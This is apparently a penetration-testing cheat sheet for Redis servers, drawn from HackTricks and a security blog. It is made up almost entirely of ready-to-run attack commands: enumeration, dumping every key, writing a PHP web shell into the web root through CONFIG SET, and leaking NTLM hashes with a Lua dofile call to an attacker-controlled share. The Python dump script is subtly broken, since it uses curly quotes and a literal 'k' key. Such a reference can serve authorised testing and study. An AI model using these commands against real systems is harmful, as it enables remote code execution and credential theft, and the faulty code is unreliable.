# Redis

Default port: `6379/tcp`

## NMAP 
    nmap --script redis-info -sV -p 6379 IP_ADDRESS

## Test connection 

    redis-cli -h IP_ADDRESS -a PASSWORD PING
## Enumeration

Get config info 

    IP_ADDRESS:6379> INFO
    IP_ADDRESS:6379> client list
    IP_ADDRESS:6379> CONFIG GET *

## Dumping Database

    SELECT 1
    [ ... Indicate the database ... ]
    KEYS * 
    [ ... Get Keys ... ]
    GET <KEY>
    [ ... Get Key ... ]

```python
import redis
db = redis.StrictRedis(host='IP_ADDRESS', port=6379)

# If we have a hash key, print all of the fields and values.
for key in db.keys():
    if db.type(key) == ‘hash’:
        r = db.hgetall(key)
        print('--------')
        for k in r:
            print('Field: {0} Value: {1}'.format(k, r['k']))
        print('--------')
```


## Upload webshell

redis-cli -h IP_ADDRESS
```bash
IP_ADDRESS:6379> config set dir /var/www/html
OK
IP_ADDRESS:6379> config set dbfilename redis.php
OK
IP_ADDRESS:6379> set test '<?php echo system($_REQUEST["cmd"]); ?>'
OK
IP_ADDRESS:6379> save
OK
```
## Leak NTLM HASH

    IP_ADDRESS:6379> eval "dofile('//R_IP_ADDRESS//share')" 0

## Built redis-cli

    git clone http://github.com/antirez/redis.git
    cd redis && git checkout 3.0 
    make redis-cli
    cp srv/redis-cli /opt/redis-cli
    ln -s /opt/redis-cli /usr/local/bin/redis-cli

# Source 

- https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
- https://www.averagesecurityguy.info/code/pentest/2015/09/17/pentesting-redis-servers/
